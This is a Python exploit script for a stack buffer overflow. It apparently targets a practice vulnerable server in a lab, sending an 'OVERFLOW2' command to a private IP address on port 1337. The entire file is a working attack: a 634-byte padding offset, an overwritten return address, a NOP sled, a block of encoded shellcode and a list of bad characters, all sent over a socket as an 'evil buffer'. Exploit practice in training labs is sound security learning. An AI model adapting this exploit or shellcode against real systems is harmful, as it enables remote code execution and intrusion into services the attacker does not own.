import socket

ip = "10.10.202.229"
port = 1337

prefix = "OVERFLOW2 "
offset = 634  #634
overflow = "A" * offset
retn = "\xaf\x11\x50\x62" #625011AF
#padding = ""
padding = "\x90" * 16
#address 625011AF
payload = ("\xfc\xbb\xbc\xa4\xae\x1c\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x40\x4c\x2c\x1c\xb8"
"\x8d\x51\x94\x5d\xbc\x51\xc2\x16\xef\x61\x80\x7a\x1c\x09\xc4"
"\x6e\x97\x7f\xc1\x81\x10\x35\x37\xac\xa1\x66\x0b\xaf\x21\x75"
"\x58\x0f\x1b\xb6\xad\x4e\x5c\xab\x5c\x02\x35\xa7\xf3\xb2\x32"
"\xfd\xcf\x39\x08\x13\x48\xde\xd9\x12\x79\x71\x51\x4d\x59\x70"
"\xb6\xe5\xd0\x6a\xdb\xc0\xab\x01\x2f\xbe\x2d\xc3\x61\x3f\x81"
"\x2a\x4e\xb2\xdb\x6b\x69\x2d\xae\x85\x89\xd0\xa9\x52\xf3\x0e"
"\x3f\x40\x53\xc4\xe7\xac\x65\x09\x71\x27\x69\xe6\xf5\x6f\x6e"
"\xf9\xda\x04\x8a\x72\xdd\xca\x1a\xc0\xfa\xce\x47\x92\x63\x57"
"\x22\x75\x9b\x87\x8d\x2a\x39\xcc\x20\x3e\x30\x8f\x2c\xf3\x79"
"\x2f\xad\x9b\x0a\x5c\x9f\x04\xa1\xca\x93\xcd\x6f\x0d\xd3\xe7"
"\xc8\x81\x2a\x08\x29\x88\xe8\x5c\x79\xa2\xd9\xdc\x12\x32\xe5"
"\x08\xb4\x62\x49\xe3\x75\xd2\x29\x53\x1e\x38\xa6\x8c\x3e\x43"
"\x6c\xa5\xd5\xbe\xe7\xc0\x20\x69\xf6\xbc\x30\x69\xe8\x60\xbc"
"\x8f\x60\x89\xe8\x18\x1d\x30\xb1\xd2\xbc\xbd\x6f\x9f\xff\x36"
"\x9c\x60\xb1\xbe\xe9\x72\x26\x4f\xa4\x28\xe1\x50\x12\x44\x6d"
"\xc2\xf9\x94\xf8\xff\x55\xc3\xad\xce\xaf\x81\x43\x68\x06\xb7"
"\x99\xec\x61\x73\x46\xcd\x6c\x7a\x0b\x69\x4b\x6c\xd5\x72\xd7"
"\xd8\x89\x24\x81\xb6\x6f\x9f\x63\x60\x26\x4c\x2a\xe4\xbf\xbe"
"\xed\x72\xc0\xea\x9b\x9a\x71\x43\xda\xa5\xbe\x03\xea\xde\xa2"
"\xb3\x15\x35\x67\xd3\xf7\x9f\x92\x7c\xae\x4a\x1f\xe1\x51\xa1"
"\x5c\x1c\xd2\x43\x1d\xdb\xca\x26\x18\xa7\x4c\xdb\x50\xb8\x38"
"\xdb\xc7\xb9\x68\xdb\xe7\x45\x93")

##bad char 00 23 24 3c 3d 83 84 ba

##      \x00\x23\x3c\x83\xba
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
